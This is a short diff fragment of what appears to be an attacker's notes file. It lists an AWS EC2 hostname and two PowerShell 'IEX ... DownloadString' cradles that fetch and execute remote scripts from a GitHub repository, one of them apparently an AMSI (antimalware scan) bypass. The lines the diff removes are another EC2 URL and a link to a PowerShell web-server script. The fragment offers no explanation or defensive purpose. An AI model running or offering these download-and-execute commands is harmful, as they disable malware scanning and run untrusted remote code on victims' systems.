@@ -4,10 +4,3 @@ ec2-3-9-48-179.eu-west-2.compute.amazonaws.com
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/amsi.txt')
 IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/caioMichele/vCard/main/run.txt')
 
-
-http://ec2-35-178-193-155.eu-west-2.compute.amazonaws.com/here
-
-
-
-https://gist.githubusercontent.com/19WAS85/5424431/raw/3a827c9f4e4065fd4550421fbbc4ad68ddf2adab/powershell-web-server.ps1
-
